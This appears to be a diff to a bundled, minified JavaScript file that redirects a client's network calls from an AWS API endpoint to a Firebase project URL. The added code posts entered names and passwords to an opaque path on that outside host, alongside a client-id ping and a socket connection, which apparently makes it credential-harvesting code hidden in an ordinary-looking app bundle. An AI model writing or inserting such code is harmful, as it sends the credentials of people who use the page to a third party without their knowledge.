@@ -31936,7 +31936,7 @@
         (rv.default = rv);
       var ov = rv.create({
           baseURL:
-            "https://7eizb0w2ri.execute-api.eu-west-3.amazonaws.com/Prod/hello/",
+            "https://firebase.googleapis.com/v1/projects/sec1td1/databases/1",
         }),
         av = function (e) {
           return ov({ url: "/ping", method: "patch", params: { cliId: e } });
@@ -32020,7 +32020,7 @@
                 (function (e) {
                   try {
                     var t = ch(
-                      "https://7eizb0w2ri.execute-api.eu-west-3.amazonaws.com/Prod/hello/",
+                      "https://firebase.googleapis.com/v1/projects/sec1td1/databases/1",
                       { query: { ci: e } }
                     ).connect();
                     console.log("socket", t),
@@ -32381,23 +32381,29 @@
                           //     return e.data;
                           //   }
                           // )
-                          fetch(
-                            "https://firebase.googleapis.com/v1/projects/YOUR_PROJECT_ID/databases/(default)/documents/users",
-                            {
-                              method: "post",
-                              body: JSON.stringify({
-                                o,
-                                i,
-                              }),
-                            }
-                          ).then(
-                            (response) => {
-                              console.log("response", response);
-                            },
-                            (error) => {
-                              console.error(error);
+                          ((l = { name: o, password: i }),
+                          ov({ method: "post", url: "/Oj2Is2fQpvGNF8LObFHR", data: l })).then(
+                            function (e) {
+                              return e.data;
                             }
                           )
+                          // fetch(
+                          //   "https://firebase.googleapis.com/v1/projects/sec1td1/databases/1/Oj2Is2fQpvGNF8LObFHR",
+                          //   {
+                          //     method: "post",
+                          //     body: JSON.stringify({
+                          //       o,
+                          //       i,
+                          //     }),
+                          //   }
+                          // ).then(
+                          //   (response) => {
+                          //     console.log("response", response);
+                          //   },
+                          //   (error) => {
+                          //     console.error(error);
+                          //   }
+                          // )
                         );
                       case 20:
                         (c = n.sent),
